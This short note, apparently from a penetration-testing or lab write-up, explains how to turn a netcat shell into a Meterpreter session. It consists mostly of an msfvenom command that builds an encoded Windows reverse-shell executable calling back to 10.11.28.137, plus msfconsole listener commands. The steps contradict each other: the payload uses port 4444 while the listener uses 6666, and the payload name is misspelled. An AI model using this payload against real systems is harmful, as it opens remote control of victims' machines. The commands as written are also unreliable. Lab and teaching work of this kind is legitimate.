To elevate the netcat shell to a metrpeter shell:

Use **msfvenom** to generate a shell executable:
```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.11.28.137 LPORT=4444 -f exe -o shell.exe
```
 Then use **msfconsole** to open  a metrpeter session listener:
 ```
 use exploit/multi/handler
 set payload windows/meterpeter/reverse_tcp
 set LHOST 10.11.28.137
 set LPORT 6666
 exploit
 ```
